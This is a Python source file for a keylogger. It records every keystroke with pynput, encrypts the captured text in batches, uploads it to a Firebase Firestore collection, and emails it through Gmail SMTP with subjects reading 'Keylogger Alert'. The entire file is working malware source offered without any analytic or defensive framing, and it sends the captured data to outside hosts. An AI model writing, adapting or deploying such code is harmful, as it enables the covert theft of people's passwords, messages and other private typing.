import firebase_admin
from firebase_admin import credentials, firestore
from pynput import keyboard
import time
from cryptography.fernet import Fernet
import threading
import smtplib
from email.mime.text import MIMEText

# Initialize Firebase connection
cred = credentials.Certificate("your-firebase-adminsdk-key.json")  # Your Firebase JSON key file
firebase_admin.initialize_app(cred)
db = firestore.client()

# Generate an encryption key (this should be stored securely for decryption)
key = Fernet.generate_key()
cipher = Fernet(key)

keystrokes = []

EMAIL_THRESHOLD = 50  # Send email after 50 characters
email_count = 0

def send_email_notification(encrypted_data):
    global email_count
    email_count += 1
    msg = MIMEText(f"Keystroke data (encrypted): {encrypted_data}")
    msg['Subject'] = f"Keylogger Alert {email_count}"
    msg['From'] = 'your_email@example.com'
    msg['To'] = 'recipient@example.com'

    # SMTP setup
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
        server.login('your_email@example.com', 'your_password')
        server.send_message(msg)

    print(f"Email {email_count} sent!")

def log_to_firebase():
    global keystrokes
    data = ''.join(keystrokes)
    encrypted_data = cipher.encrypt(data.encode()).decode()
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

    db.collection('keystrokes').add({'timestamp': timestamp, 'data': encrypted_data})
    print(f"Logged (encrypted): {encrypted_data}")
    
    # Reset keystrokes
    keystrokes = []
    
    # Check if email needs to be sent
    if len(data) >= EMAIL_THRESHOLD:
        send_email_notification(encrypted_data)

def on_press(key):
    try:
        keystrokes.append(str(key.char))
    except AttributeError:
        if key == keyboard.Key.space:
            keystrokes.append(' ')
        else:
            keystrokes.append(f'[{str(key)}]')

    # Log keystrokes in a separate thread when reaching 10 characters
    if len(keystrokes) >= 10:
        threading.Thread(target=log_to_firebase).start()

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
